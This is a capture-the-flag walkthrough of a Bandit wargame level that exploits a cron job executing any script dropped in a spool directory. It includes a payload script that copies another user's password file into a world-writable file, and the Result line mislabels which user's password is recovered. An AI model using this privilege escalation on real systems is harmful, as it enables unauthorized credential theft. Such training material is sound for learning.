# Bandit Level 23 → Level 24

## Level Goal

A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and change the program invoked in the cron job to run our own script instead.

## Recon

Start by checking the cron configuration to see what's being run automatically, and as which user.

```bash
cat /etc/cron.d/cronjob_bandit24
```

Output:

```
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

So every minute, a script runs **as bandit24**. Checking what that script does:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

Key takeaway: any file dropped in `/var/spool/bandit24/foo/` gets **executed as bandit24**, then deleted. That's our privilege escalation path — bandit24 can read its own password, and if we get it to run our script, it'll do that reading for us.

## Setting Up a Workspace

`/var/spool/bandit24/` itself isn't writable by bandit23 (only `foo/` inside it is, since the cron script needs to drop files there). We also can't write to `bandit23`'s home directory in some spots (e.g. no `.local/share/nano/`), so it's cleanest to work out of a fresh temp directory:

```bash
mktemp -d
cd /tmp/tmp.XXXXXXXXXX   # use the path mktemp gave you
```

## Building the Payload Script

Create a script that copies bandit24's password into a file we can read:

```bash
echo '#!/bin/bash' > bandit24_pass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXXXXXX/password' >> bandit24_pass.sh
chmod +x bandit24_pass.sh
```

**Gotchas I hit along the way:**

- The output path in the script must point to a **file**, not just the temp directory — `> /tmp/tmp.XXXXXXXXXX` (no filename) silently fails because you can't redirect into a directory.
- The destination file needs to be writable by *anyone*, since the script runs as bandit24, not bandit23. `chmod +rwx password` isn't enough — your umask can strip the "other" write bit. Use an explicit numeric mode instead:
  ```bash
  touch password
  chmod 777 password
  ```
- You must drop the script inside `/var/spool/bandit24/foo/`, not directly in `/var/spool/bandit24/` — the latter isn't writable by bandit23.

## Executing the Exploit

```bash
cp bandit24_pass.sh /var/spool/bandit24/foo/bandit24_pass.sh
```

Wait about a minute for the cron job to pick it up and run it (it runs once per minute), then check:

```bash
cat password
```

## Result

```
<32-character password for bandit25>
```

## Lessons Learned

- World-writable directories combined with a cron job that executes *anything* dropped in them is a classic local privilege escalation pattern — always worth checking `/etc/cron.d/`, `/etc/crontab`, and spool directories for this kind of setup.
- Numeric `chmod` (e.g. `chmod 777`) is more predictable than symbolic `chmod +rwx` when umask settings might interfere.
- Double-check that scripts you expect another user/process to run actually have correct, absolute output paths — a directory vs. file redirect mistake is easy to miss and fails silently.
